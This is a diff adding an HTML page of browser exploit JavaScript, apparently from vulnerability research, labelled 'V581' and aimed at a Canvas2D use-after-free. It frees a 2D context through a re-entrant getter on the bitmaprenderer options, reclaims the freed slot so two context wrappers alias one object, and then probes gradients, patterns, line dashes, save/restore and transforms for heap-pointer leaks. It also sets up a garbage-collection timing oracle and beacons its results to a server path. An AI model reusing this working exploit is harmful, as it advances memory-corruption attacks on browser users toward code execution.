@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V581</title></head>
+<body><pre id="out">V581 — pointer leak via aliased Canvas2D state fields</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V581-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+var f64=new Float64Array(1);
+var u32=new Uint32Array(f64.buffer);
+function dblHex(d){f64[0]=d;return'0x'+('00000000'+u32[1].toString(16)).slice(-8)+('00000000'+u32[0].toString(16)).slice(-8);}
+
+bk('BOOT','v581-pointer-leak-probe');
+say('V581: pointer leak via aliased Canvas2D state\n');
+
+/* ===== Same-type reclaim (V573 technique) =====
+   1. Create canvas1, get ctx1 = 2d
+   2. Replace ctx1 with bitmaprenderer (frees C++ context, JS wrapper survives)
+   3. Create canvas2, get ctx2 = 2d (reclaims same 768B slot)
+   4. ctx1 and ctx2 now alias the same C++ CanvasRenderingContext2D
+   5. Writes through ctx2 visible via ctx1 reads and vice versa
+*/
+
+var innerCtx1 = null;
+function triggerUAF() {
+  var c = document.createElement('canvas');
+  c.width = 1; c.height = 1;
+  var d = {};
+  Object.defineProperty(d, 'alpha', {get: function() {
+    var ctx = c.getContext('2d');
+    innerCtx1 = ctx;
+    return true;
+  }});
+  c.getContext('bitmaprenderer', d);
+  return c;
+}
+
+/* Step 1: Create aliased pair */
+bk('PHASE1','creating-alias');
+var outerC = triggerUAF();
+
+/* Step 2: Reclaim with fresh 2d context */
+var canvas2 = document.createElement('canvas');
+canvas2.width = 1; canvas2.height = 1;
+var ctx2 = canvas2.getContext('2d');
+
+/* Verify alias */
+ctx2.lineWidth = 7777.7777;
+var aliasCheck = innerCtx1.lineWidth;
+var aliased = (Math.abs(aliasCheck - 7777.7777) < 0.001);
+bk('ALIAS', aliased ? 'YES,lw=' + aliasCheck : 'NO,lw=' + aliasCheck);
+say('Alias check: ' + (aliased ? 'CONFIRMED' : 'FAILED') + ' (lw=' + aliasCheck + ')');
+
+if (!aliased) {
+  bk('ABORT','alias-failed');
+  say('ABORT: alias not established');
+} else {
+
+  /* ===== PROBE 1: strokeStyle/fillStyle as gradient =====
+     CanvasStyle variant at State+16 (stroke) and +32 (fill).
+     When set to a gradient, the variant stores RefPtr<CanvasGradient>.
+     The RefPtr is a raw pointer (8 bytes) in the variant's data union.
+
+     Q: Can we read that pointer back through the OTHER alias?
+     Approach: ctx2 sets gradient, read lineWidth-adjacent fields via ctx1
+     to see if any reinterpret the gradient pointer bytes as a double.
+  */
+  bk('PHASE2','gradient-probe');
+
+  /* Create gradient objects */
+  var grad1, grad2;
+  try {
+    grad1 = ctx2.createLinearGradient(0, 0, 100, 100);
+    grad1.addColorStop(0, 'red');
+    grad1.addColorStop(1, 'blue');
+    grad2 = ctx2.createLinearGradient(0, 0, 200, 200);
+    grad2.addColorStop(0, '#00ff00');
+    grad2.addColorStop(1, '#ff00ff');
+    bk('GRAD','created-2-gradients');
+  } catch(e) {
+    bk('GRAD-ERR', e.name + ':' + e.message.slice(0,60));
+  }
+
+  /* Set stroke to gradient via ctx2, read back via ctx1 */
+  var strokeBefore = '';
+  try { strokeBefore = innerCtx1.strokeStyle; } catch(e) { strokeBefore = 'ERR:' + e.name; }
+  bk('SS-BEFORE', typeof strokeBefore + ':' + String(strokeBefore).slice(0,100));
+  say('strokeStyle before: ' + typeof strokeBefore + ' = ' + String(strokeBefore).slice(0,80));
+
+  try {
+    ctx2.strokeStyle = grad1;
+    var ssRead = innerCtx1.strokeStyle;
+    var ssType = typeof ssRead;
+    bk('SS-GRAD', ssType + ':' + String(ssRead).slice(0,200));
+    say('strokeStyle after grad (via alias): type=' + ssType + ' val=' + String(ssRead).slice(0,80));
+
+    if (ssType === 'object' && ssRead !== null) {
+      bk('SS-OBJ', ssRead.constructor ? ssRead.constructor.name : 'unknown');
+      say('  constructor: ' + (ssRead.constructor ? ssRead.constructor.name : 'unknown'));
+    }
+  } catch(e) {
+    bk('SS-GRAD-ERR', e.name + ':' + e.message.slice(0,100));
+    say('strokeStyle grad read ERROR: ' + e.name + ': ' + e.message.slice(0,80));
+  }
+
+  /* Try fillStyle too */
+  try {
+    ctx2.fillStyle = grad2;
+    var fsRead = innerCtx1.fillStyle;
+    bk('FS-GRAD', typeof fsRead + ':' + String(fsRead).slice(0,200));
+    say('fillStyle after grad (via alias): type=' + typeof fsRead + ' val=' + String(fsRead).slice(0,80));
+  } catch(e) {
+    bk('FS-GRAD-ERR', e.name + ':' + e.message.slice(0,100));
+  }
+
+  /* ===== PROBE 2: Read doubles that overlap with gradient pointer bytes =====
+     State layout:
+     +16 strokeStyle (CanvasStyle variant, 16B)
+     +32 fillStyle (CanvasStyle variant, 16B)
+     +48 lineWidth (double, 8B)
+
+     The CanvasStyle variant stores: [8B data][discriminator+pad]
+     If data = gradient pointer, can we read those 8 bytes as a double?
+
+     Idea: save() creates a copy of State. If we manipulate state before/after
+     save(), the stateStack entries have different values. But both aliases
+     read the SAME stateStack.
+
+     Better idea: read the raw bytes through getImageData/putImageData trick?
+     No — that reads pixel data, not state.
+
+     Direct approach: the gradient pointer IS at +16 in State.
+     lineWidth IS at +48. They don't overlap.
+
+     But: if we could read the strokeStyle CanvasStyle bytes AS a double,
+     that would give us the pointer. The getter returns the parsed gradient
+     object, not the raw bytes. We need a TYPE CONFUSION within the variant.
+  */
+
+  /* ===== PROBE 3: lineDash vector — pointer in State struct =====
+     WTF::Vector<float> m_lineDash somewhere in State.
+     Vector layout: { float* m_buffer; uint32_t m_size; uint32_t m_capacity; }
+     If we set a lineDash via ctx2 and the vector allocates a heap buffer,
+     then read the State memory at that offset, m_buffer is a heap pointer.
+
+     But getLineDash() returns a new JS array, not the raw vector header.
+
+     KEY IDEA: What if lineWidth, miterLimit etc at nearby offsets can be
+     read to get bytes from the Vector header? Need to know exact offset
+     of m_lineDash in State struct.
+  */
+  bk('PHASE3','linedash-probe');
+
+  /* Set lineDash via ctx2, read various fields via ctx1 */
+  ctx2.setLineDash([5, 10, 15, 20, 25, 30, 35, 40]);
+
+  var dashRead = [];
+  try {
+    dashRead = innerCtx1.getLineDash();
+    bk('DASH-READ', 'len=' + dashRead.length + ',vals=' + Array.prototype.slice.call(dashRead, 0, 8).join(','));
+    say('lineDash via alias: len=' + dashRead.length + ' vals=' + Array.prototype.slice.call(dashRead).join(','));
+  } catch(e) {
+    bk('DASH-ERR', e.name + ':' + e.message.slice(0,80));
+    say('lineDash ERROR: ' + e.message);
+  }
+
+  /* ===== PROBE 4: Read ALL double-typed state fields =====
+     After setting gradient+lineDash via ctx2, read every numerical field
+     via ctx1. Any unexpected non-default value could be pointer leakage
+     if field offsets overlap with pointer storage.
+  */
+  bk('PHASE4','full-state-dump');
+
+  /* Reset to known values first */
+  ctx2.lineWidth = 42.42;
+  ctx2.miterLimit = 43.43;
+  ctx2.globalAlpha = 0.7777;
+  ctx2.shadowBlur = 55.55;
+  ctx2.shadowOffsetX = 66.66;
+  ctx2.shadowOffsetY = 77.77;
+  ctx2.lineDashOffset = 88.88;
+  ctx2.shadowColor = 'rgba(17, 34, 51, 0.75)';
+
+  /* Read all via ctx1 */
+  var fields = {};
+  try { fields.lineWidth = innerCtx1.lineWidth; } catch(e) { fields.lineWidth = 'E:'+e.name; }
+  try { fields.miterLimit = innerCtx1.miterLimit; } catch(e) { fields.miterLimit = 'E:'+e.name; }
+  try { fields.globalAlpha = innerCtx1.globalAlpha; } catch(e) { fields.globalAlpha = 'E:'+e.name; }
+  try { fields.shadowBlur = innerCtx1.shadowBlur; } catch(e) { fields.shadowBlur = 'E:'+e.name; }
+  try { fields.shadowOffsetX = innerCtx1.shadowOffsetX; } catch(e) { fields.shadowOffsetX = 'E:'+e.name; }
+  try { fields.shadowOffsetY = innerCtx1.shadowOffsetY; } catch(e) { fields.shadowOffsetY = 'E:'+e.name; }
+  try { fields.lineDashOffset = innerCtx1.lineDashOffset; } catch(e) { fields.lineDashOffset = 'E:'+e.name; }
+  try { fields.shadowColor = innerCtx1.shadowColor; } catch(e) { fields.shadowColor = 'E:'+e.name; }
+  try { fields.strokeStyle = innerCtx1.strokeStyle; } catch(e) { fields.strokeStyle = 'E:'+e.name; }
+  try { fields.fillStyle = innerCtx1.fillStyle; } catch(e) { fields.fillStyle = 'E:'+e.name; }
+
+  var dump = '';
+  var keys = Object.keys(fields);
+  for (var ki = 0; ki < keys.length; ki++) {
+    var k = keys[ki];
+    var v = fields[k];
+    var hex = '';
+    if (typeof v === 'number') hex = ' hex=' + dblHex(v);
+    dump += k + '=' + v + hex + '; ';
+    say('  ' + k + ' = ' + v + hex);
+  }
+  bk('DUMP', dump.slice(0, 400));
+
+  /* ===== PROBE 5: save/restore state leakage =====
+     ctx2.save() pushes current state. ctx2 modifies state. ctx1.restore() pops.
+     Does the stateStack properly sync? Or can we read stale/mixed data?
+  */
+  bk('PHASE5','save-restore-cross');
+
+  ctx2.lineWidth = 1111.1111;
+  ctx2.save();
+  ctx2.lineWidth = 2222.2222;
+  ctx2.save();
+  ctx2.lineWidth = 3333.3333;
+
+  var sr1, sr2, sr3;
+  try {
+    sr3 = innerCtx1.lineWidth;
+    innerCtx1.restore();
+    sr2 = innerCtx1.lineWidth;
+    innerCtx1.restore();
+    sr1 = innerCtx1.lineWidth;
+  } catch(e) {
+    bk('SR-ERR', e.name + ':' + e.message.slice(0,80));
+    say('save/restore ERROR: ' + e.message);
+    sr1 = sr2 = sr3 = 'ERR';
+  }
+  bk('SR', 'top=' + sr3 + ',pop1=' + sr2 + ',pop2=' + sr1);
+  say('\nsave/restore cross-alias:');
+  say('  current (3333): ' + sr3);
+  say('  after restore1 (2222): ' + sr2);
+  say('  after restore2 (1111): ' + sr1);
+
+  /* ===== PROBE 6: Pattern from canvas =====
+     createPattern() returns a CanvasPattern. Setting it as fillStyle stores
+     RefPtr<CanvasPattern> in the CanvasStyle variant at +32.
+
+     What if we create a pattern, set it via ctx2, then read fillStyle
+     via ctx1? The getter checks the variant discriminator and returns
+     the object — but what if the discriminator is type-confused?
+  */
+  bk('PHASE6','pattern-probe');
+
+  var patCanvas = document.createElement('canvas');
+  patCanvas.width = 2; patCanvas.height = 2;
+  var patCtx = patCanvas.getContext('2d');
+  patCtx.fillStyle = '#ff0000';
+  patCtx.fillRect(0, 0, 2, 2);
+
+  try {
+    var pat = ctx2.createPattern(patCanvas, 'repeat');
+    ctx2.fillStyle = pat;
+    var patRead = innerCtx1.fillStyle;
+    bk('PAT-READ', typeof patRead + ':' + String(patRead).slice(0,200));
+    say('fillStyle(pattern) via alias: type=' + typeof patRead + ' val=' + String(patRead).slice(0,80));
+
+    /* Now try: set fillStyle to a COLOR via ctx1, but the variant at +32
+       was previously a Pattern. Does the color overwrite clear the pointer? */
+    innerCtx1.fillStyle = '#abcdef';
+    var afterColor = ctx2.fillStyle;
+    bk('PAT-AFTER', typeof afterColor + ':' + String(afterColor).slice(0,200));
+    say('fillStyle after color overwrite: ' + afterColor);
+  } catch(e) {
+    bk('PAT-ERR', e.name + ':' + e.message.slice(0,100));
+    say('pattern ERROR: ' + e.message);
+  }
+
+  /* ===== PROBE 7: unparsedStrokeColor string pointer =====
+     State+0 and +8 hold String (StringImpl*).
+     When ctx.strokeStyle = '#rrggbb', the parsed color goes into the
+     CanvasStyle variant, and the ORIGINAL STRING goes into unparsedStrokeColor.
+
+     StringImpl* is a heap pointer. If we could read those 8 bytes as a double...
+     strokeStyle getter returns the SERIALIZED color, not the unparsed string.
+     But the pointer IS in the State memory.
+
+     Can we access it? Not directly through any Canvas2D API — the getter
+     always re-serializes from the CanvasStyle variant.
+  */
+
+  /* ===== PROBE 8: getTransform matrix =====
+     DOMMatrix is returned fresh each call. Check if any transform
+     values leak internal state when read through alias.
+  */
+  bk('PHASE8','transform-probe');
+
+  ctx2.setTransform(1.5, 0.25, 0.75, 2.5, 100.5, 200.5);
+  try {
+    var xf = innerCtx1.getTransform();
+    bk('XF', 'a='+dblHex(xf.a)+',b='+dblHex(xf.b)+',c='+dblHex(xf.c)+',d='+dblHex(xf.d)+',e='+dblHex(xf.e)+',f='+dblHex(xf.f));
+    say('\ntransform via alias:');
+    say('  a=' + xf.a + ' b=' + xf.b + ' c=' + xf.c);
+    say('  d=' + xf.d + ' e=' + xf.e + ' f=' + xf.f);
+  } catch(e) {
+    bk('XF-ERR', e.name + ':' + e.message.slice(0,80));
+  }
+
+  /* ===== PROBE 9: FinalizationRegistry GC timing =====
+     Can we detect WHEN GC runs by registering objects?
+     This gives us a GC oracle to time our operations.
+  */
+  bk('PHASE9','gc-timing');
+
+  var gcFired = false;
+  var gcTime = 0;
+  try {
+    var fr = new FinalizationRegistry(function(val) {
+      gcFired = true;
+      gcTime = performance.now();
+      bk('GC-FIRE', 'val=' + val + ',t=' + gcTime);
+      say('GC fired: val=' + val);
+    });
+    var tmp = {};
+    fr.register(tmp, 'sentinel');
+    tmp = null;
+    bk('FR-REG', 'registered-sentinel');
+  } catch(e) {
+    bk('FR-ERR', e.name + ':' + e.message.slice(0,60));
+  }
+}
+
+/* Final beacon after delay (allows worker/FR callbacks) */
+setTimeout(function() {
+  bk('DONE', 'v581-complete,gcFired=' + (typeof gcFired !== 'undefined' ? gcFired : 'N/A'));
+  say('\nV581 complete. GC fired: ' + (typeof gcFired !== 'undefined' ? gcFired : 'N/A'));
+}, 4000);
+</script>
+</body></html>
